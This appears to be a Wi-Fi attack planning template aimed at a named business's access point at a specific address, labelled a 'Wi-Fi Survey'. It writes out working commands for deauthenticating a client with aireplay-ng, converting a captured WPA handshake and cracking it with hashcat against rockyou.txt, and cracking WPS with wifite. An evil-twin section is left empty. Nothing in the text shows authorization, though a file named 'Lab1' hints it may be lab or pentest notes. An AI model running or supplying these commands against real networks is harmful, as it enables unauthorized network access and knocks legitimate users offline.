#Target Templates
#Situation:
Colstone creamery access point 
#Position:
8530 Washington Blvd, Jessup, MD 20794
#Operation:
Wi-Fi Survey
#Time:
Jan 15 2024, 13:41

#SSID(human network name)##############


#BSSID(Make address)##############


#CHANNEL##############


#MAKE/MODEL##############


#ENCRYPTION##############


#ASSOCIATED CLIENTS##############


#DEAUTH##############
sudo aireplay-ng -0 1 -a <TARGET AP> -c <TGT CLIENT> wlx00c0cab46234 
hcxpcapngtool -o dict.hash.22000 Lab1.handshake # this will generate a hash of the file
hashcat -a 0 -m 22000 dict.hash.22000 rockyou.txt
--

#PIXIE/REAVER/WPS CRACK##############
sudo wifite --wps-only 

---

#EVIL TWIN##############
---